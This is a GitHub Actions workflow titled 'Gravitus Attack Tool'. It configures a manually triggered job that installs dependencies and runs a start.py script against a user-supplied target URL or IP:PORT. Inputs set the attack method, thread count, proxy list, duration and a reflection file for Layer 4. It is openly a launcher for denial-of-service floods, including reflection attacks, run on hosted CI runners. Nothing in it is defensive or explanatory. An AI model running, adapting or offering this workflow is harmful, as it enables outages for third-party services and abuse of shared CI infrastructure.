name: Gravitus Attack Tool

on:
  workflow_dispatch:
    inputs:
      layer:
        description: 'Layer (7 or 4)'
        required: true
        default: '7'
      method:
        description: 'Attack Method'
        required: true
        default: 'get'
      target:
        description: 'Target (URL for Layer7, IP:PORT for Layer4)'
        required: true
        default: 'https://example.com'
      threads:
        description: 'Number of threads'
        required: true
        default: '30'
      proxy_file:
        description: 'Proxy file name'
        required: true
        default: 'proxy.txt'
      rpc:
        description: 'RPC (Layer7 only)'
        required: false
        default: ''
      duration:
        description: 'Duration in seconds'
        required: true
        default: '120'
      reflection_file:
        description: 'Reflection file (Layer4 only)'
        required: false
        default: ''

jobs:
  run-gravitus:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup System
      run: |
        apt -y update
        apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git

    - name: Install Python Dependencies
      run: |
        pip3 install -r requirements.txt

    - name: Run Layer7 Attack
      if: inputs.layer == '7'
      run: |
        python3 start.py ${{ inputs.method }} ${{ inputs.target }} ${{ inputs.threads }} ${{ inputs.proxy_file }} ${{ inputs.rpc }} ${{ inputs.duration }}

    - name: Run Layer4 Attack
      if: inputs.layer == '4'
      run: |
        python3 start.py ${{ inputs.method }} ${{ inputs.target }} ${{ inputs.threads }} ${{ inputs.duration }} ${{ inputs.reflection_file }}

